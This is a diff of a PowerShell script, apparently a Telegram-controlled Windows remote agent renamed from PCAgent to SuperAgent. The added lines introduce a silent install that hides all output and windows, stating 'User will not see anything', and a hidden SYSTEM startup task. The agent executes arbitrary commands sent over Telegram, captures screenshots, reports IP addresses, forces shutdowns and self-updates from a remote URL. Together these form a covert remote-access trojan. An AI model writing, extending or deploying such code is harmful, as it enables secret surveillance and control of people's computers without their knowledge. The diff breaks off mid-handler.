@@ -1,15 +1,19 @@
 # =====================================================================
-# PCAgent - Telegram-controlled Windows agent (single-file)
+# SuperAgent - Telegram-controlled Windows agent (single-file)
 # Usage:
-#   Install:   irm <REPO>/pcagent.ps1 | iex -Install [-BotToken X -ChatId Y -PCName Z]
-#   Uninstall: irm <REPO>/pcagent.ps1 | iex -Uninstall
+#   Install:   irm <REPO>/pcagent.ps1 | iex -Install [-BotToken X -ChatId Y -PCName Z] [-Silent]
+#   Uninstall: irm <REPO>/pcagent.ps1 | iex -Uninstall [-Silent]
 #   Agent:     powershell -File pcagent.ps1 -Run   (auto via Scheduled Task)
+#
+# -Silent: no console output, no pause. After install, agent runs hidden.
+#          Only /msg command will show popup. User will not see anything.
 # =====================================================================
 [CmdletBinding()]
 param(
     [switch]$Install,
     [switch]$Uninstall,
     [switch]$Run,
+    [switch]$Silent,
 
     [string]$BotToken,
     [string]$ChatId,
@@ -34,15 +38,35 @@ try {
 # =====================================================================
 # CONSTANTS
 # =====================================================================
- $InstallDir   = 'C:\ProgramData\PCAgent'
+ $InstallDir   = 'C:\ProgramData\SuperAgent'
  $ConfigPath   = Join-Path $InstallDir 'config.json'
  $OffsetPath   = Join-Path $InstallDir 'offset.txt'
  $ScriptPath   = Join-Path $InstallDir 'pcagent.ps1'
  $LogPath      = Join-Path $InstallDir 'agent.log'
- $TaskName     = 'PCAgent'
+ $TaskName     = 'SuperAgent'
+
+# =====================================================================
+# Silent-aware logging: in -Silent mode, suppress all console output
+# =====================================================================
+if ($Silent) {
+    $ErrorActionPreference = 'SilentlyContinue'
+    # Redirect all output streams to $null
+    $null = New-Item -Path 'Alias:' -Name 'Write-Host' -Value 'Out-Null' -Force -ErrorAction SilentlyContinue
+} else {
+    $ErrorActionPreference = 'Stop'
+}
+
+function Write-Msg {
+    # Wrapper that respects -Silent
+    param([string]$Message, [string]$Color = 'White')
+    if (-not $Silent) {
+        Write-Host $Message -ForegroundColor $Color
+    }
+}
 
 # =====================================================================
 # AUTO-ELEVATE: if -Install/-Uninstall and not admin, relaunch as admin
+# In -Silent mode, the elevated process runs with -WindowStyle Hidden
 # =====================================================================
 function Test-IsAdmin {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -52,8 +76,8 @@ function Test-IsAdmin {
 
 function Invoke-SelfElevation {
     # Rebuild the original command line and relaunch via Start-Process -Verb RunAs
-    # Preserves all original parameters (-Install, -BotToken, -ChatId, -PCName, ...)
-    $argString = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    # Preserves all original parameters (-Install, -BotToken, -ChatId, -PCName, -Silent, ...)
+    $argString = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
     foreach ($key in $PSBoundParameters.Keys) {
         $val = $PSBoundParameters[$key]
         if ($val -is [System.Management.Automation.SwitchParameter]) {
@@ -64,23 +88,27 @@ function Invoke-SelfElevation {
         }
     }
 
-    Write-Host ''
-    Write-Host '[*] Chua co quyen Admin. Dang xin quyen (UAC)...' -ForegroundColor Yellow
-    Write-Host '    Neu hoi dialog UAC, click Yes de cho phep.' -ForegroundColor Yellow
-    Write-Host ''
+    Write-Msg ''
+    Write-Msg '[*] Requesting Admin Permission (UAC)...' -Color Yellow
+    Write-Msg '    Please click Yes on the UAC dialog.' -Color Yellow
+    Write-Msg ''
 
     try {
+        # -WindowStyle Hidden on the elevated process: no flashing window
         $p = Start-Process -FilePath 'powershell.exe' `
                             -ArgumentList $argString `
                             -Verb RunAs `
+                            -WindowStyle Hidden `
                             -PassThru `
                             -Wait
         exit $p.ExitCode
     } catch {
-        Write-Host ''
-        Write-Host '[-] Ban da tu choi UAC hoac khong the elevate.' -ForegroundColor Red
-        Write-Host '    Mo PowerShell -> Right-click -> Run as Administrator -> chay lai lenh.' -ForegroundColor Red
-        Read-Host 'Nhan Enter de thoat'
+        Write-Msg ''
+        Write-Msg '[-] UAC denied or elevation failed.' -Color Red
+        Write-Msg '    Open PowerShell as Administrator and re-run the command.' -Color Red
+        if (-not $Silent) {
+            try { Read-Host 'Press Enter to exit' | Out-Null } catch { }
+        }
         exit 1
     }
 }
@@ -102,47 +130,48 @@ if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
 
     # (Admin check done by auto-elevate above)
 
-    # --- Interactive prompts for missing params ---
-    if (-not $BotToken) {
-        $BotToken = Read-Host 'Bot Token (vd: 123456789:ABCdef...)'
+    # --- Interactive prompts for missing params (skipped in -Silent mode) ---
+    if (-not $BotToken -and -not $Silent) {
+        $BotToken = Read-Host 'Bot Token (e.g. 123456789:ABCdef...)'
     }
-    if (-not $ChatId) {
-        $ChatId = Read-Host 'Chat ID (vd: 123456789, hoac -100xxxxxx cho group)'
+    if (-not $ChatId -and -not $Silent) {
+        $ChatId = Read-Host 'Chat ID (e.g. 123456789, or -100xxxxxx for group)'
     }
-    if (-not $PCName) {
-        $PCName = Read-Host "PC Name (vd: PC-VanPhong, Laptop-NV)"
+    if (-not $PCName -and -not $Silent) {
+        $PCName = Read-Host "PC Name (e.g. PC-Office, Laptop-NV)"
     }
 
     # --- Validate ---
     if ($PCName -notmatch '^[A-Za-z][A-Za-z0-9_\-]{1,31}$') {
-        throw "PCName khong hop le: '$PCName'. Chi duoc chu cai, so, gach duoi, gach ngang (2-32 ky tu, bat dau bang chu cai)."
+        throw "Invalid PCName: '$PCName'. Allowed: letters, digits, underscore, dash (2-32 chars, must start with a letter)."
     }
     if (-not $BotToken) {
-        throw 'Thieu Bot Token. Khong the cai dat.'
+        throw 'Bot Token is required.'
     }
     if ($BotToken -notmatch '^\d+:[A-Za-z0-9_\-]{30,}$') {
-        Write-Host "! Bot Token co ve khong dung dinh dang (vd: 123456789:ABCdef...). Tiep tuc nhung co the khong hoat dong." -ForegroundColor Yellow
+        Write-Msg "! Bot Token format looks invalid (e.g. 123456789:ABCdef...). Continuing but may not work." -Color Yellow
     }
     if ($RepoUrl -match 'USERNAME/REPO') {
         throw @'
-!!! CHUA SUA $RepoUrl TRONG FILE pcagent.ps1 !!!
+!!! $RepoUrl NOT UPDATED IN pcagent.ps1 !!!
 
-Ban can:
-  1. Tai file pcagent.ps1 ve may
-  2. Mo bang notepad/VSCode
-  3. Tim dong: $RepoUrl = 'https://raw.githubusercontent.com/USERNAME/REPO/main'
-  4. Sua USERNAME/REPO thanh GitHub username + repo name cua ban
-  5. Push file len GitHub
-  6. Chay lai lenh cai
+You must:
+  1. Download pcagent.ps1
+  2. Open with Notepad/VSCode
+  3. Find line: $RepoUrl = 'https://raw.githubusercontent.com/USERNAME/REPO/main'
+  4. Replace USERNAME/REPO with your GitHub username + repo name
+  5. Push file to GitHub
+  6. Re-run install command
 '@
     }
 
-    Write-Host ''
-    Write-Host '=== PCAgent Installer ===' -ForegroundColor Cyan
-    Write-Host "  PC Name  : $PCName"
-    Write-Host "  Chat ID  : $ChatId"
-    Write-Host "  Repo URL : $RepoUrl"
-    Write-Host ''
+    Write-Msg ''
+    Write-Msg '=== SuperAgent Installer ===' -Color Cyan
+    Write-Msg "  PC Name  : $PCName"
+    Write-Msg "  Chat ID  : $ChatId"
+    Write-Msg "  Repo URL : $RepoUrl"
+    Write-Msg "  Silent   : $Silent"
+    Write-Msg ''
 
     # --- Create folder ---
     if (-not (Test-Path $InstallDir)) {
@@ -152,15 +181,15 @@ Ban can:
     # --- Save script locally (copy current file, or download from $RepoUrl) ---
     if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
         Copy-Item $PSCommandPath $ScriptPath -Force
-        Write-Host '[+] Da copy script tu local.' -ForegroundColor Green
+        Write-Msg '[+] Script copied from local.' -Color Green
     } else {
         $scriptUrl = "$RepoUrl/pcagent.ps1"
-        Write-Host "[*] Downloading pcagent.ps1 tu $scriptUrl ..."
+        Write-Msg "[*] Downloading pcagent.ps1 from $scriptUrl ..."
         try {
             Invoke-WebRequest -Uri $scriptUrl -OutFile $ScriptPath -TimeoutSec 30 -UseBasicParsing
-            Write-Host '[+] Da download script.' -ForegroundColor Green
+            Write-Msg '[+] Script downloaded.' -Color Green
         } catch {
-            throw "Khong download duoc pcagent.ps1 tu $scriptUrl : $($_.Exception.Message). Kiem tra lai RepoUrl trong file config hoac network."
+            throw "Failed to download pcagent.ps1 from $scriptUrl : $($_.Exception.Message). Check RepoUrl in config or network."
         }
     }
 
@@ -170,15 +199,15 @@ Ban can:
         ChatId      = $ChatId
         PCName      = $PCName
         RepoUrl     = $RepoUrl.TrimEnd('/')
-        Version     = '2.0.0'
+        Version     = '2.1.0'
         InstalledAt = (Get-Date -Format 'o')
     }
     $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
-    Write-Host '[+] Da luu config.json' -ForegroundColor Green
+    Write-Msg '[+] config.json saved' -Color Green
 
     # --- Remove existing scheduled task ---
     if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
-        Write-Host '[*] Cap nhat scheduled task cu...'
+        Write-Msg '[*] Updating existing scheduled task...'
         try {
             Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
             Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
@@ -186,9 +215,10 @@ Ban can:
     }
 
     # --- Create scheduled task: SYSTEM, AtStartup, auto-restart ---
-    Write-Host '[*] Tao scheduled task (SYSTEM, AtStartup, auto-restart)...'
+    # Hidden window: -WindowStyle Hidden. No console flash on boot.
+    Write-Msg '[*] Creating scheduled task (SYSTEM, AtStartup, auto-restart, hidden)...'
     $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
-                 -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Run"
+                 -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptPath`" -Run"
     $trigger   = New-ScheduledTaskTrigger -AtStartup
     $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
     $settings  = New-ScheduledTaskSettingsSet `
@@ -203,58 +233,65 @@ Ban can:
     Register-ScheduledTask -TaskName $TaskName `
         -Action $action -Trigger $trigger `
         -Principal $principal -Settings $settings `
-        -Description 'PCAgent - Telegram remote control agent' | Out-Null
+        -Description 'SuperAgent - Telegram remote control agent' | Out-Null
 
     Start-ScheduledTask -TaskName $TaskName
-    Write-Host '[+] Scheduled task da tao va chay.' -ForegroundColor Green
+    Write-Msg '[+] Scheduled task created and started.' -Color Green
 
-    # --- Wait & verify agent started + sent Telegram message ---
-    Write-Host ''
-    Write-Host '[*] Dang cho agent gui thong bao Telegram (toi da 20s)...' -ForegroundColor Cyan
+    # --- Wait & verify agent started + sent Telegram message (only if not silent) ---
     $verified = $false
-    for ($i = 0; $i -lt 20; $i++) {
-        Start-Sleep -Seconds 1
-        if (Test-Path $LogPath) {
-            $logTail = Get-Content $LogPath -Tail 20 -ErrorAction SilentlyContinue
-            if ($logTail -match 'sendMessage OK') {
-                $verified = $true
-                break
-            }
-            if ($logTail -match 'sendMessage FAIL') {
-                Write-Host '[!] Agent da gui Telegram nhung THAT BAI. Xem log:' -ForegroundColor Red
-                $logTail | Where-Object { $_ -match 'FAIL|ERROR' } | Select-Object -Last 5 | ForEach-Object {
-                    Write-Host "    $_" -ForegroundColor Yellow
+    if (-not $Silent) {
+        Write-Msg ''
+        Write-Msg '[*] Waiting for agent to send Telegram notification (up to 20s)...' -Color Cyan
+        for ($i = 0; $i -lt 20; $i++) {
+            Start-Sleep -Seconds 1
+            if (Test-Path $LogPath) {
+                $logTail = Get-Content $LogPath -Tail 20 -ErrorAction SilentlyContinue
+                if ($logTail -match 'sendMessage OK') {
+                    $verified = $true
+                    break
                 }
-                break
+                if ($logTail -match 'sendMessage FAIL') {
+                    Write-Msg '[!] Agent sent Telegram but FAILED. Log tail:' -Color Red
+                    $logTail | Where-Object { $_ -match 'FAIL|ERROR' } | Select-Object -Last 5 | ForEach-Object {
+                        Write-Msg "    $_" -Color Yellow
+                    }
+                    break
+                }
             }
         }
+    } else {
+        # Silent mode: still wait a moment to ensure task started, but no console output
+        Start-Sleep -Seconds 3
     }
 
-    Write-Host ''
-    Write-Host '====================================================' -ForegroundColor Green
-    Write-Host ' CAI DAT HOAN TAT' -ForegroundColor Green
-    Write-Host '====================================================' -ForegroundColor Green
-    Write-Host " Folder          : $InstallDir"
-    Write-Host " Config          : $ConfigPath"
-    Write-Host " Script          : $ScriptPath"
-    Write-Host " Log             : $LogPath"
-    Write-Host " Scheduled Task  : $TaskName (SYSTEM, AtStartup)"
-    Write-Host ""
-    if ($verified) {
-        Write-Host " [v] Agent da gui thong bao Telegram thanh cong!" -ForegroundColor Green
-        Write-Host "     Kiem tra Telegram, neu van khong nhan dc tin:" -ForegroundColor Yellow
-        Write-Host "       1. Bot da duoc add vao group (neu dung group chat)?" -ForegroundColor Yellow
-        Write-Host "       2. Group privacy: /setprivacy = Disabled trong @BotFather?" -ForegroundColor Yellow
-        Write-Host "       3. Gui /status cho bot de kiem tra 2-chieu" -ForegroundColor Yellow
+    Write-Msg ''
+    Write-Msg '====================================================' -Color Green
+    Write-Msg ' INSTALLATION COMPLETE' -Color Green
+    Write-Msg '====================================================' -Color Green
+    Write-Msg " Folder          : $InstallDir"
+    Write-Msg " Config          : $ConfigPath"
+    Write-Msg " Script          : $ScriptPath"
+    Write-Msg " Log             : $LogPath"
+    Write-Msg " Scheduled Task  : $TaskName (SYSTEM, AtStartup, Hidden)"
+    Write-Msg ""
+    if ($Silent) {
+        Write-Msg " [v] Silent install done. Agent runs hidden in background." -Color Green
+    } elseif ($verified) {
+        Write-Msg " [v] Agent successfully sent Telegram notification!" -Color Green
+        Write-Msg "     If you still don't see it in Telegram, check:" -Color Yellow
+        Write-Msg "       1. Bot added to group (if using group chat)?" -Color Yellow
+        Write-Msg "       2. Group privacy: /setprivacy = Disabled in @BotFather?" -Color Yellow
+        Write-Msg "       3. Send /status to bot to test 2-way communication" -Color Yellow
     } else {
-        Write-Host " [!] Chua xac nhan duoc thong bao Telegram da gui." -ForegroundColor Yellow
-        Write-Host "     Xem log chi tiet: $LogPath" -ForegroundColor Yellow
-        Write-Host "     Hoac gui lenh: /log cho bot qua Telegram (neu bot da reply)" -ForegroundColor Yellow
+        Write-Msg " [!] Telegram notification not confirmed." -Color Yellow
+        Write-Msg "     See log: $LogPath" -Color Yellow
+        Write-Msg "     Or send /log to bot via Telegram (if bot replies)" -Color Yellow
     }
-    Write-Host ""
-    Write-Host " De go cai:"
-    Write-Host "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall"
-    Write-Host ""
+    Write-Msg ""
+    Write-Msg " To uninstall:"
+    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall -Silent"
+    Write-Msg ""
 }
 
 # =====================================================================
@@ -262,14 +299,14 @@ Ban can:
 # =====================================================================
  $UninstallBlock = {
     $ErrorActionPreference = 'Continue'
-    Write-Host '[*] Dang go cai PCAgent...' -ForegroundColor Cyan
+    Write-Msg '[*] Uninstalling SuperAgent...' -Color Cyan
 
     try {
         Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-        Write-Host '[+] Da xoa scheduled task.' -ForegroundColor Green
+        Write-Msg '[+] Scheduled task removed.' -Color Green
     } catch {
-        Write-Host '[.] Khong co scheduled task de xoa.' -ForegroundColor Yellow
+        Write-Msg '[.] No scheduled task to remove.' -Color Yellow
     }
 
     # Kill any running agent processes
@@ -281,11 +318,11 @@ Ban can:
 
     if (Test-Path $InstallDir) {
         Remove-Item -Recurse -Force $InstallDir -ErrorAction SilentlyContinue
-        Write-Host '[+] Da xoa folder.' -ForegroundColor Green
+        Write-Msg '[+] Folder removed.' -Color Green
     }
 
-    Write-Host ''
-    Write-Host '[+] GO CAI XONG.' -ForegroundColor Green
+    Write-Msg ''
+    Write-Msg '[+] UNINSTALL COMPLETE.' -Color Green
 }
 
 # =====================================================================
@@ -329,7 +366,7 @@ Ban can:
         } catch { }
     }
 
-    Write-Log "=== Agent khoi dong (PCName=$PCName, ChatId=$ChatId, RepoUrl=$RepoUrl) ==="
+    Write-Log "=== Agent started (PCName=$PCName, ChatId=$ChatId, RepoUrl=$RepoUrl) ==="
 
     # --- Helper functions ---
     function Send-Telegram {
@@ -349,28 +386,28 @@ Ban can:
 
     function Send-TelegramPhoto {
         param([string]$FilePath, [string]$Caption = '')
-        if (-not (Test-Path $FilePath)) { Send-Telegram "[$PCName] File anh khong ton tai"; return }
+        if (-not (Test-Path $FilePath)) { Send-Telegram "[$PCName] Image file not found"; return }
         $url = "https://api.telegram.org/bot$BotToken/sendPhoto"
         $capArg = if ($Caption) { "-F `"caption=$Caption`"" } else { '' }
         $cmd = "curl.exe -s -m 60 -X POST `"$url`" -F `"chat_id=$ChatId`" $capArg -F `"photo=@$FilePath`""
         try { Invoke-Expression $cmd | Out-Null }
-        catch { Send-Telegram "[$PCName] Loi gui anh: $($_.Exception.Message)" }
+        catch { Send-Telegram "[$PCName] Failed to send image: $($_.Exception.Message)" }
     }
 
     function Wait-Network {
         $maxAttempts = 0
-        Write-Log "Wait-Network: bat dau cho mang..."
+        Write-Log "Wait-Network: waiting for network..."
         while ($true) {
             try {
                 $null = Invoke-RestMethod -Uri 'https://api.telegram.org' -TimeoutSec 5
-                Write-Log "Wait-Network: OK co mang (sau $maxAttempts lan thu)"
+                Write-Log "Wait-Network: OK, network available (after $maxAttempts attempts)"
                 return $true
             } catch {
                 Start-Sleep -Seconds 3
                 $maxAttempts++
-                if ($maxAttempts % 10 -eq 0) { Write-Log "Wait-Network: van cho... ($maxAttempts lan)" }
+                if ($maxAttempts % 10 -eq 0) { Write-Log "Wait-Network: still waiting... ($maxAttempts attempts)" }
                 if ($maxAttempts -gt 600) {
-                    Write-Log "Wait-Network: TIMEOUT sau 30 phut, bo qua"
+                    Write-Log "Wait-Network: TIMEOUT after 30 minutes, skipping"
                     return $false
                 }
             }
@@ -403,18 +440,18 @@ Ban can:
             $cpuName = if ($cpu) { $cpu.Name } else { 'N/A' }
 
             return @"
-*$PCName* - PC da online
-|- Ten may: $($cs.Name)
-|- IP noi bo: $localIP
-|- IP ngoai: $externIP
+*$PCName* - PC is online
+|- Computer name: $($cs.Name)
+|- Local IP: $localIP
+|- External IP: $externIP
 |- OS: $($os.Caption) ($($os.Version))
 |- CPU: $cpuName
-|- RAM: ${totalRAM}GB (da dung ${ramPct}%)
-|- Uptime: $($up.Days) ngay $($up.Hours)h $($up.Minutes)phut
-|- Thoi gian: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+|- RAM: ${totalRAM}GB (used ${ramPct}%)
+|- Uptime: $($up.Days) days $($up.Hours)h $($up.Minutes)m
+|- Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 "@
         } catch {
-            return "[$PCName] Loi lay thong tin PC: $($_.Exception.Message)"
+            return "[$PCName] Failed to get PC info: $($_.Exception.Message)"
         }
     }
 
@@ -435,9 +472,50 @@ Ban can:
         }
         if (-not $username) { return $false }
 
-        $taskName = "PCAgent_User_$(Get-Random)"
+        $taskName = "SuperAgent_User_$(Get-Random)"
         $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                      -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
+        $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
+        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive -RunLevel Highest
+        $settings  = New-ScheduledTaskSettingsSet -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
+
+        try {
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
+                -Principal $principal -Settings $settings -Force | Out-Null
+            Start-ScheduledTask -TaskName $taskName
+        } catch { return $false }
+
+        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false } catch {}"
+        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$cleanup`"" -WindowStyle Hidden | Out-Null
+        return $true
+    }
+
+    function Invoke-InUserSessionWithArgs {
+        param([string]$TempScriptPath, [string[]]$ArgumentList)
+
+        $username = $null
+        try {
+            $explorer = Get-Process -IncludeUserName explorer -ErrorAction SilentlyContinue |
+                        Sort-Object SessionId | Select-Object -First 1
+            if ($explorer) { $username = $explorer.UserName }
+        } catch { }
+        if (-not $username) {
+            try {
+                $u = (Get-CimInstance Win32_ComputerSystem).UserName
+                if ($u) { $username = $u }
+            } catch { }
+        }
+        if (-not $username) { return $false }
+
+        # Build argument string: -File <script> <arg1> <arg2> ...
+        $argStr = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
+        foreach ($a in $ArgumentList) {
+            $escaped = $a -replace "'", "''"
+            $argStr += " '$escaped'"
+        }
+
+        $taskName = "SuperAgent_User_$(Get-Random)"
+        $action    = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argStr
         $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
         $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive -RunLevel Highest
         $settings  = New-ScheduledTaskSettingsSet -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
@@ -456,26 +534,47 @@ Ban can:
     function Invoke-Screenshot {
         $outFile  = Join-Path $InstallDir "shot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
         $tmpScript = Join-Path $InstallDir '_shot.ps1'
-        @"
-Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-`$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-`$bmp = New-Object System.Drawing.Bitmap(`$screen.Width, `$screen.Height)
-`$g = [System.Drawing.Graphics]::FromImage(`$bmp)
-`$g.CopyFromScreen(`$screen.Location, [System.Drawing.Point]::Empty, `$screen.Size)
-`$bmp.Save('$outFile', [System.Drawing.Imaging.ImageFormat]::Png)
-`$g.Dispose(); `$bmp.Dispose()
-"@ | Out-File $tmpScript -Encoding UTF8
 
-        $ok = Invoke-InUserSession -TempScriptPath $tmpScript
+        # Build screenshot script content (DPI-aware, full screen)
+        # Use double-quoted here-string outer, single-quoted inner for C# code
+        # Escape $ as `$ so it's literal in output
+        $scriptContent = @"
+param([string]`$OutPath)
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
+`$csCode = @'
+using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Runtime.InteropServices;
+
+public static class ScreenCap {
+    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
+    [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
+    public static void Capture(string path) {
+        SetProcessDPIAware();
+        int w = GetSystemMetrics(0);
+        int h = GetSystemMetrics(1);
+        Bitmap bmp = new Bitmap(w, h);
+        Graphics g = Graphics.FromImage(bmp);
+        g.CopyFromScreen(0, 0, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
+        bmp.Save(path, ImageFormat.Png);
+        g.Dispose();
+        bmp.Dispose();
+    }
+}
+'@
+Add-Type `$csCode
+[ScreenCap]::Capture(`$OutPath)
+"@
+        $scriptContent | Out-File $tmpScript -Encoding UTF8
+
+        # Run via user session (pass outFile as argument)
+        $ok = Invoke-InUserSessionWithArgs -TempScriptPath $tmpScript -ArgumentList $outFile
         if (-not $ok) {
             try {
-                Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-                $g = [System.Drawing.Graphics]::FromImage($bmp)
-                $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-                $bmp.Save($outFile, [System.Drawing.Imaging.ImageFormat]::Png)
-                $g.Dispose(); $bmp.Dispose()
+                # Fallback: run directly in SYSTEM session (may capture only wallpaper)
+                & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript $outFile 2>&1 | Out-Null
                 $ok = $true
             } catch { return $null }
         } else {
@@ -500,21 +599,21 @@ Add-Type -AssemblyName System.Windows.Forms,System.Drawing
         $tmpScript = Join-Path $InstallDir '_msg.ps1'
         @"
 Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.MessageBox]::Show('$safe', 'PCAgent Message', 'OK', 'Information') | Out-Null
+[System.Windows.Forms.MessageBox]::Show('$safe', 'SuperAgent Message', 'OK', 'Information') | Out-Null
 "@ | Out-File $tmpScript -Encoding UTF8
         return Invoke-InUserSession -TempScriptPath $tmpScript
     }
 
     function Invoke-Exec {
         param([string]$Command)
-        if (-not $Command) { return 'Khong co lenh.' }
+        if (-not $Command) { return 'No command provided.' }
         try {
             $result = Invoke-Expression $Command 2>&1 | Out-String
-            if (-not $result) { $result = '(khong co output)' }
+            if (-not $result) { $result = '(no output)' }
             if ($result.Length -gt 3900) { $result = $result.Substring(0, 3900) + "`n...[truncated]" }
             return $result
         } catch {
-            return "Loi: $($_.Exception.Message)"
+            return "Error: $($_.Exception.Message)"
         }
     }
 
@@ -524,14 +623,14 @@ Add-Type -AssemblyName System.Windows.Forms
         try {
             Invoke-WebRequest -Uri $newUrl -OutFile $tempFile -TimeoutSec 30 -UseBasicParsing
             $size = (Get-Item $tempFile).Length
-            if ($size -lt 1000) { throw "File moi qua nho ($size bytes)" }
+            if ($size -lt 1000) { throw "New file too small ($size bytes)" }
             Move-Item $tempFile $ScriptPath -Force
-            Send-Telegram "[$PCName] Da update xong, dang restart agent..."
+            Send-Telegram "[$PCName] Update complete, restarting agent..."
 
             $restartCmd = "Start-Sleep -Seconds 3; try { Stop-ScheduledTask -TaskName '$TaskName' -ErrorAction SilentlyContinue } catch {}; Start-Sleep -Seconds 2; try { Start-ScheduledTask -TaskName '$TaskName' } catch {}"
             Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$restartCmd`"" -WindowStyle Hidden | Out-Null
         } catch {
-            Send-Telegram "[$PCName] Loi update: $($_.Exception.Message)"
+            Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)"
             if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
         }
     }
@@ -541,7 +640,7 @@ Add-Type -AssemblyName System.Windows.Forms
     $bootMsg = Get-PCInfo
     $bootOk = Send-Telegram $bootMsg
     if (-not $bootOk) {
-        Write-Log "Boot notification FAIL - kiem tra BotToken/ChatId/network"
+        Write-Log "Boot notification FAIL - check BotToken/ChatId/network"
     }
 
     # --- Main polling loop ---
@@ -609,17 +708,17 @@ Add-Type -AssemblyName System.Windows.Forms
 
                     switch ($cmd) {
                         '/shutdown' {
-                            Send-Telegram "[$PCName] Dang shutdown..."
-                            shutdown /s /t 3 /f /c 'PCAgent: Remote shutdown'
+                            Send-Telegram "[$PCName] Shutting down..."
+                            shutdown /s /t 3 /f /c 'SuperAgent: Remote shutdown'
                         }
                         '/restart' {
-                            Send-Telegram "[$PCName] Dang restart..."
-                            shutdown /r /t 3 /f /c 'PCAgent: Remote restart'
+                            Send-Telegram "[$PCName] Restarting..."
+                            shutdown /r /t 3 /f /c 'SuperAgent: Remote restart'
                         }
                         '/lock' {
                             $ok = Invoke-Lock
-                            if ($ok) { Send-Telegram "[$PCName] Da khoa man hinh" }
-                            else     { Send-Telegram "[$PCName] Khong co user session active de lock" }
+                            if ($ok) { Send-Telegram "[$PCName] Screen locked" }
+                            else     { Send-Telegram "[$PCName] No active user session to lock" }
                         }
                         '/status' {
                             Send-Telegram (Get-PCInfo)
@@ -630,16 +729,35 @@ Add-Type -AssemblyName System.Windows.Forms
                                 Send-TelegramPhoto -FilePath $file -Caption "[$PCName] $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
                                 Remove-Item $file -Force -ErrorAction SilentlyContinue
                             } else {
-                                Send-Telegram "[$PCName] Loi chup man hinh (khong co user session?)"
+                                Send-Telegram "[$PCName] Screenshot failed (no user session?)"
                             }
                         }
                         '/msg' {
-                            if ($restText) {
-                                $ok = Invoke-Msg -Text $restText
-                                if ($ok) { Send-Telegram "[$PCName] Da hien thi: $restText" }
-                                else     { Send-Telegram "[$PCName] Khong the hien thi (khong co user session)" }
+                            # /msg REQUIRES @pc - single PC only
+                            if (-not $pcname) {
+                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`n(e.g. /msg @PC-Office Hello)`nUse /msgall <text> to broadcast to ALL PCs."
+                            } elseif (-not $restText) {
+                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`n(e.g. /msg @PC-Office Hello)"
                             } else {
-                                Send-Telegram "[$PCName] Cu phap: /msg @pc <noi dung>"
+                                $ok = Invoke-Msg -Text $restText
+                                if ($ok) { Send-Telegram "[$PCName] Displayed: $restText" }
+                                else     { Send-Telegram "[$PCName] Cannot display (no user session)" }
+                            }
+                        }
+                        '/msgall' {
+                            # /msgall <text> - broadcast to ALL PCs, no @pc needed
+                            $allArgs = $parts[1..($parts.Length - 1)]
+                            # Strip leading @pc if user typed it by mistake
+                            if ($allArgs -and $allArgs[0].StartsWith('@')) {
+                                $allArgs = $allArgs[1..($allArgs.Length - 1)]
+                            }
+                            $msgText = ($allArgs -join ' ').Trim()
+                            if ($msgText) {
+                                $ok = Invoke-Msg -Text $msgText
+                                if ($ok) { Send-Telegram "[$PCName] Displayed (broadcast): $msgText" }
+                                else     { Send-Telegram "[$PCName] Cannot display (no user session)" }
+                            } else {
